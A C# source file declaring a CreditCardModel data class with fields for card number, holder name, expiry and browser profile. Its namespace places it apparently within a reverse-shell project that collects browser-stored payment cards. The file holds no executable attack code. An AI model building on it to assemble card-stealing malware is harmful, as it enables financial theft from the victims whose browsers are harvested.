using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.model.broswer
{
    internal class CreditCardModel
    {
        public string? CardName { get; set; }
        public string? ExpirationMonth { get; set; }
        public string? ExpirationYear { get; set; }
        public string? Card { get; set; }
        public string? Origin { get; set; }

        public string? DateModified { get; set; }
        public string? BrowserProfile { get; set; }

        public CreditCardModel(string? CardName, string? ExpirationMonth,
            string? Origin, string? Card, string? DateModified, string? ExpirationYear, string? BrowserProfile)
        {

            this.CardName = CardName;
            this.ExpirationMonth = ExpirationMonth;
            this.ExpirationYear = ExpirationYear;
            this.Origin = Origin;
            this.Card = Card;
            this.DateModified = DateModified;
            this.BrowserProfile = BrowserProfile;


        }
    }
}
